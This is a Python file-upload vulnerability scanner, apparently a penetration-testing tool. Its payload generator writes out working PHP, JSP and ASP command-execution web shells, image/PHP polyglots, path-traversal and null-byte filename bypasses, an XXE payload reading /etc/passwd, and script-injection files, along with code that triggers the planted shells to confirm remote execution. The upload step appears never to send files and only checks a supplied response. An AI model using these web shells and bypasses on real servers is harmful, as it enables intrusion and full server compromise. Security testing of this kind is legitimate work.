from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import threading
import time
import hashlib
import mimetypes
import base64
from pathlib import Path

class UploadVulnerabilityType(Enum):
    UNRESTRICTED_UPLOAD = "unrestricted_upload"
    WEAK_VALIDATION = "weak_validation"
    EXTENSION_BYPASS = "extension_bypass"
    MIME_TYPE_BYPASS = "mime_type_bypass"
    DOUBLE_EXTENSION = "double_extension"
    NULL_BYTE_INJECTION = "null_byte_injection"
    CASE_MANIPULATION = "case_manipulation"
    POLYGLOT_FILE = "polyglot_file"
    PATH_TRAVERSAL = "path_traversal"
    RCE_VIA_UPLOAD = "rce_via_upload"
    XXE_VIA_UPLOAD = "xxe_via_upload"
    XSS_VIA_UPLOAD = "xss_via_upload"
    SSRF_VIA_UPLOAD = "ssrf_via_upload"

class FileType(Enum):
    PHP = "php"
    JSP = "jsp"
    ASP = "asp"
    ASPX = "aspx"
    SVG = "svg"
    HTML = "html"
    XML = "xml"
    SWF = "swf"
    EXECUTABLE = "exe"
    SCRIPT = "script"
    IMAGE = "image"
    DOCUMENT = "document"

@dataclass
class UploadPayload:
    filename: str
    content: bytes
    content_type: str
    file_type: FileType
    bypass_technique: str
    malicious_code: str
    description: str
    severity: str = "High"
    detection_indicators: List[str] = field(default_factory=list)

@dataclass
class UploadVulnerability:
    vulnerability_type: str
    upload_type: UploadVulnerabilityType
    url: str
    upload_endpoint: str
    filename: str
    file_type: str
    severity: str
    evidence: str
    response_status: int
    response_size: int
    file_accessible: bool
    file_location: Optional[str] = None
    execution_confirmed: bool = False
    bypass_technique: str = ""
    content_type_used: str = ""
    confirmed: bool = False
    confidence_score: float = 0.8
    remediation: str = ""
    timestamp: float = field(default_factory=time.time)

class MegaPayloadGenerator:
    @staticmethod
    def generate_php_payloads() -> List[UploadPayload]:
        payloads = []
        
        php_shells = [
            '<?php system($_GET["cmd"]); ?>',
            '<?php eval($_POST["code"]); ?>',
            '<?php phpinfo(); ?>',
            '<?php echo shell_exec($_GET["c"]); ?>',
            '<?php passthru($_GET["cmd"]); ?>',
        ]
        
        extensions = [
            'php', 'php3', 'php4', 'php5', 'php7', 'phtml', 'phar', 'phps'
        ]
        
        for shell in php_shells:
            for ext in extensions:
                payloads.append(UploadPayload(
                    filename=f'shell.{ext}',
                    content=shell.encode(),
                    content_type='application/x-php',
                    file_type=FileType.PHP,
                    bypass_technique='extension_variation',
                    malicious_code=shell,
                    description=f'PHP shell with .{ext} extension'
                ))
        
        payloads.extend([
            UploadPayload(
                filename='shell.php.jpg',
                content=php_shells[0].encode(),
                content_type='image/jpeg',
                file_type=FileType.PHP,
                bypass_technique='double_extension',
                malicious_code=php_shells[0],
                description='Double extension bypass'
            ),
            UploadPayload(
                filename='shell.php%00.jpg',
                content=php_shells[0].encode(),
                content_type='image/jpeg',
                file_type=FileType.PHP,
                bypass_technique='null_byte',
                malicious_code=php_shells[0],
                description='Null byte injection'
            ),
            UploadPayload(
                filename='shell.PHP',
                content=php_shells[0].encode(),
                content_type='application/x-php',
                file_type=FileType.PHP,
                bypass_technique='case_manipulation',
                malicious_code=php_shells[0],
                description='Case manipulation'
            ),
            UploadPayload(
                filename='shell.PhP',
                content=php_shells[0].encode(),
                content_type='application/x-php',
                file_type=FileType.PHP,
                bypass_technique='mixed_case',
                malicious_code=php_shells[0],
                description='Mixed case bypass'
            ),
        ])
        
        return payloads
    
    @staticmethod
    def generate_jsp_payloads() -> List[UploadPayload]:
        payloads = []
        
        jsp_shell = '<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd); %>'
        
        extensions = ['jsp', 'jspx', 'jsw', 'jsv', 'jspf']
        
        for ext in extensions:
            payloads.append(UploadPayload(
                filename=f'shell.{ext}',
                content=jsp_shell.encode(),
                content_type='application/jsp',
                file_type=FileType.JSP,
                bypass_technique='extension_variation',
                malicious_code=jsp_shell,
                description=f'JSP shell with .{ext} extension'
            ))
        
        return payloads
    
    @staticmethod
    def generate_asp_payloads() -> List[UploadPayload]:
        payloads = []
        
        asp_shells = [
            '<%execute request("cmd")%>',
            '<%eval request("code")%>',
        ]
        
        extensions = ['asp', 'aspx', 'asa', 'cer', 'cdx']
        
        for shell in asp_shells:
            for ext in extensions:
                payloads.append(UploadPayload(
                    filename=f'shell.{ext}',
                    content=shell.encode(),
                    content_type='application/x-asp',
                    file_type=FileType.ASP if ext == 'asp' else FileType.ASPX,
                    bypass_technique='extension_variation',
                    malicious_code=shell,
                    description=f'ASP shell with .{ext} extension'
                ))
        
        return payloads
    
    @staticmethod
    def generate_svg_payloads() -> List[UploadPayload]:
        payloads = []
        
        svg_xss = '<svg onload="alert(document.domain)"><script>alert(1)</script></svg>'
        svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'
        
        payloads.extend([
            UploadPayload(
                filename='xss.svg',
                content=svg_xss.encode(),
                content_type='image/svg+xml',
                file_type=FileType.SVG,
                bypass_technique='svg_xss',
                malicious_code=svg_xss,
                description='SVG with XSS payload'
            ),
            UploadPayload(
                filename='xxe.svg',
                content=svg_xxe.encode(),
                content_type='image/svg+xml',
                file_type=FileType.SVG,
                bypass_technique='svg_xxe',
                malicious_code=svg_xxe,
                description='SVG with XXE payload'
            ),
        ])
        
        return payloads
    
    @staticmethod
    def generate_html_payloads() -> List[UploadPayload]:
        payloads = []
        
        html_xss = '<html><body><script>alert(document.cookie)</script></body></html>'
        
        extensions = ['html', 'htm', 'shtml', 'shtm']
        
        for ext in extensions:
            payloads.append(UploadPayload(
                filename=f'xss.{ext}',
                content=html_xss.encode(),
                content_type='text/html',
                file_type=FileType.HTML,
                bypass_technique='html_xss',
                malicious_code=html_xss,
                description=f'HTML with XSS - .{ext}'
            ))
        
        return payloads
    
    @staticmethod
    def generate_polyglot_payloads() -> List[UploadPayload]:
        payloads = []
        
        gif_php = b'GIF89a' + b'<?php system($_GET["cmd"]); ?>'.ljust(100, b'\x00')
        
        jpg_php = (
            b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
            b'<?php system($_GET["cmd"]); ?>'
        )
        
        png_php = (
            b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
            b'\x08\x02\x00\x00\x00\x90wS\xde'
            b'<?php system($_GET["cmd"]); ?>'
        )
        
        payloads.extend([
            UploadPayload(
                filename='shell.gif',
                content=gif_php,
                content_type='image/gif',
                file_type=FileType.PHP,
                bypass_technique='polyglot_gif_php',
                malicious_code='<?php system($_GET["cmd"]); ?>',
                description='GIF/PHP polyglot'
            ),
            UploadPayload(
                filename='shell.jpg',
                content=jpg_php,
                content_type='image/jpeg',
                file_type=FileType.PHP,
                bypass_technique='polyglot_jpg_php',
                malicious_code='<?php system($_GET["cmd"]); ?>',
                description='JPG/PHP polyglot'
            ),
            UploadPayload(
                filename='shell.png',
                content=png_php,
                content_type='image/png',
                file_type=FileType.PHP,
                bypass_technique='polyglot_png_php',
                malicious_code='<?php system($_GET["cmd"]); ?>',
                description='PNG/PHP polyglot'
            ),
        ])
        
        return payloads
    
    @staticmethod
    def generate_path_traversal_payloads() -> List[UploadPayload]:
        payloads = []
        
        php_shell = '<?php system($_GET["cmd"]); ?>'
        
        filenames = [
            '../shell.php',
            '../../shell.php',
            '../../../shell.php',
            '..\\shell.php',
            '..\\..\\shell.php',
            '....//....//shell.php',
            '..;/shell.php',
        ]
        
        for filename in filenames:
            payloads.append(UploadPayload(
                filename=filename,
                content=php_shell.encode(),
                content_type='application/x-php',
                file_type=FileType.PHP,
                bypass_technique='path_traversal',
                malicious_code=php_shell,
                description=f'Path traversal: {filename}'
            ))
        
        return payloads
    
    @staticmethod
    def generate_all_payloads() -> List[UploadPayload]:
        all_payloads = []
        all_payloads.extend(MegaPayloadGenerator.generate_php_payloads())
        all_payloads.extend(MegaPayloadGenerator.generate_jsp_payloads())
        all_payloads.extend(MegaPayloadGenerator.generate_asp_payloads())
        all_payloads.extend(MegaPayloadGenerator.generate_svg_payloads())
        all_payloads.extend(MegaPayloadGenerator.generate_html_payloads())
        all_payloads.extend(MegaPayloadGenerator.generate_polyglot_payloads())
        all_payloads.extend(MegaPayloadGenerator.generate_path_traversal_payloads())
        return all_payloads

class MegaUploadDetector:
    @staticmethod
    def detect_upload_success(response: Dict, payload: UploadPayload) -> Tuple[bool, str]:
        content = response.get('content', '')
        status = response.get('status_code', 0)
        headers = response.get('headers', {})
        
        success_indicators = [
            'upload successful',
            'file uploaded',
            'successfully uploaded',
            'upload complete',
            'file saved',
            payload.filename,
        ]
        
        if status in [200, 201]:
            if any(ind in content.lower() for ind in success_indicators):
                return True, 'Upload success confirmed by response'
        
        location = headers.get('Location', '')
        if location:
            return True, f'File location: {location}'
        
        return False, 'Upload status unclear'
    
    @staticmethod
    def extract_file_location(response: Dict, payload: UploadPayload) -> Optional[str]:
        content = response.get('content', '')
        headers = response.get('headers', {})
        
        location = headers.get('Location', '')
        if location:
            return location
        
        url_patterns = [
            re.compile(r'(?:href|src)=["\']([^"\']+' + re.escape(payload.filename) + r')["\']'),
            re.compile(r'(?:url|path|location)["\']?\s*:\s*["\']([^"\']+' + re.escape(payload.filename) + r')["\']'),
            re.compile(r'/uploads?/[^"\'\s]+'),
            re.compile(r'/files?/[^"\'\s]+'),
        ]
        
        for pattern in url_patterns:
            match = pattern.search(content)
            if match:
                return match.group(1) if match.groups() else match.group(0)
        
        return None

class MegaExecutionVerifier:
    @staticmethod
    def verify_php_execution(session, file_url: str, timeout: int = 10) -> Tuple[bool, str]:
        test_urls = [
            f'{file_url}?cmd=echo%20PWNED',
            f'{file_url}?c=echo%20PWNED',
        ]
        
        for test_url in test_urls:
            try:
                response = session.get(test_url, timeout=timeout, verify=False)
                if 'PWNED' in response.text:
                    return True, 'PHP execution confirmed'
            except:
                pass
        
        return False, 'PHP execution not confirmed'
    
    @staticmethod
    def verify_jsp_execution(session, file_url: str, timeout: int = 10) -> Tuple[bool, str]:
        test_url = f'{file_url}?cmd=echo%20PWNED'
        
        try:
            response = session.get(test_url, timeout=timeout, verify=False)
            if 'PWNED' in response.text:
                return True, 'JSP execution confirmed'
        except:
            pass
        
        return False, 'JSP execution not confirmed'
    
    @staticmethod
    def verify_asp_execution(session, file_url: str, timeout: int = 10) -> Tuple[bool, str]:
        test_url = f'{file_url}?cmd=Response.Write("PWNED")'
        
        try:
            response = session.get(test_url, timeout=timeout, verify=False)
            if 'PWNED' in response.text:
                return True, 'ASP execution confirmed'
        except:
            pass
        
        return False, 'ASP execution not confirmed'
    
    @staticmethod
    def verify_xss_execution(session, file_url: str, timeout: int = 10) -> Tuple[bool, str]:
        try:
            response = session.get(file_url, timeout=timeout, verify=False)
            
            xss_indicators = ['<script>', 'alert(', 'onerror=', 'onload=']
            if any(ind in response.text for ind in xss_indicators):
                return True, 'XSS payload present in response'
        except:
            pass
        
        return False, 'XSS not confirmed'

class FileUploadScanner:
    def __init__(self, max_workers: int = 20):
        self.payload_generator = MegaPayloadGenerator()
        self.upload_detector = MegaUploadDetector()
        self.execution_verifier = MegaExecutionVerifier()
        
        self.vulnerabilities = []
        self.lock = threading.Lock()
        self.max_workers = max_workers
    
    def scan(self, target_url: str, upload_endpoint: str, response: Dict, 
             session=None, enable_execution_check: bool = True) -> List[UploadVulnerability]:
        
        vulns = []
        payloads = self.payload_generator.generate_all_payloads()
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for payload in payloads[:100]:
                future = executor.submit(
                    self._test_upload,
                    target_url, upload_endpoint, payload, response, session, enable_execution_check
                )
                futures.append(future)
            
            for future in as_completed(futures):
                vuln = future.result()
                if vuln:
                    vulns.append(vuln)
        
        with self.lock:
            self.vulnerabilities.extend(vulns)
        
        return vulns
    
    def _test_upload(self, url: str, endpoint: str, payload: UploadPayload, 
                     response: Dict, session, enable_exec: bool) -> Optional[UploadVulnerability]:
        
        success, evidence = self.upload_detector.detect_upload_success(response, payload)
        
        if not success:
            return None
        
        file_location = self.upload_detector.extract_file_location(response, payload)
        
        execution_confirmed = False
        if enable_exec and file_location and session:
            file_url = urljoin(url, file_location) if not file_location.startswith('http') else file_location
            
            if payload.file_type == FileType.PHP:
                execution_confirmed, exec_evidence = self.execution_verifier.verify_php_execution(session, file_url)
                evidence += f' | {exec_evidence}'
            elif payload.file_type == FileType.JSP:
                execution_confirmed, exec_evidence = self.execution_verifier.verify_jsp_execution(session, file_url)
                evidence += f' | {exec_evidence}'
            elif payload.file_type in [FileType.ASP, FileType.ASPX]:
                execution_confirmed, exec_evidence = self.execution_verifier.verify_asp_execution(session, file_url)
                evidence += f' | {exec_evidence}'
            elif payload.file_type in [FileType.SVG, FileType.HTML]:
                execution_confirmed, exec_evidence = self.execution_verifier.verify_xss_execution(session, file_url)
                evidence += f' | {exec_evidence}'
        
        vuln_type = self._determine_vuln_type(payload, execution_confirmed)
        severity = self._calc_severity(vuln_type, execution_confirmed)
        confidence = self._calc_confidence(success, file_location, execution_confirmed)
        
        return UploadVulnerability(
            vulnerability_type='File Upload Vulnerability',
            upload_type=vuln_type,
            url=url,
            upload_endpoint=endpoint,
            filename=payload.filename,
            file_type=payload.file_type.value,
            severity=severity,
            evidence=evidence,
            response_status=response.get('status_code', 0),
            response_size=len(response.get('content', '')),
            file_accessible=file_location is not None,
            file_location=file_location,
            execution_confirmed=execution_confirmed,
            bypass_technique=payload.bypass_technique,
            content_type_used=payload.content_type,
            confirmed=execution_confirmed or file_location is not None,
            confidence_score=confidence,
            remediation=self._get_remediation()
        )
    
    def _determine_vuln_type(self, payload: UploadPayload, exec_confirmed: bool) -> UploadVulnerabilityType:
        if exec_confirmed:
            return UploadVulnerabilityType.RCE_VIA_UPLOAD
        
        technique_map = {
            'double_extension': UploadVulnerabilityType.DOUBLE_EXTENSION,
            'null_byte': UploadVulnerabilityType.NULL_BYTE_INJECTION,
            'case_manipulation': UploadVulnerabilityType.CASE_MANIPULATION,
            'mixed_case': UploadVulnerabilityType.CASE_MANIPULATION,
            'polyglot': UploadVulnerabilityType.POLYGLOT_FILE,
            'path_traversal': UploadVulnerabilityType.PATH_TRAVERSAL,
            'svg_xxe': UploadVulnerabilityType.XXE_VIA_UPLOAD,
            'svg_xss': UploadVulnerabilityType.XSS_VIA_UPLOAD,
            'html_xss': UploadVulnerabilityType.XSS_VIA_UPLOAD,
        }
        
        for key, vuln_type in technique_map.items():
            if key in payload.bypass_technique:
                return vuln_type
        
        return UploadVulnerabilityType.UNRESTRICTED_UPLOAD
    
    def _calc_severity(self, vuln_type: UploadVulnerabilityType, exec_confirmed: bool) -> str:
        if exec_confirmed or vuln_type == UploadVulnerabilityType.RCE_VIA_UPLOAD:
            return 'Critical'
        
        high_severity = [
            UploadVulnerabilityType.UNRESTRICTED_UPLOAD,
            UploadVulnerabilityType.XXE_VIA_UPLOAD,
        ]
        
        if vuln_type in high_severity:
            return 'High'
        
        return 'Medium'
    
    def _calc_confidence(self, success: bool, file_location: Optional[str], exec_confirmed: bool) -> float:
        confidence = 0.5 if success else 0.0
        
        if file_location:
            confidence += 0.3
        
        if exec_confirmed:
            confidence += 0.2
        
        return min(confidence, 1.0)
    
    def _get_remediation(self) -> str:
        return (
            "1. Validate file extensions (allowlist). "
            "2. Check MIME types server-side. "
            "3. Rename uploaded files. "
            "4. Store outside web root. "
            "5. Set execute permissions to false. "
            "6. Scan files with antivirus. "
            "7. Limit file size. "
            "8. Use random filenames. "
            "9. Validate file content. "
            "10. Implement WAF rules."
        )
    
    def get_vulnerabilities(self):
        with self.lock:
            return self.vulnerabilities.copy()
    
    def clear(self):
        with self.lock:
            self.vulnerabilities.clear()

def urljoin(base, url):
    if url.startswith('http'):
        return url
    return base.rstrip('/') + '/' + url.lstrip('/')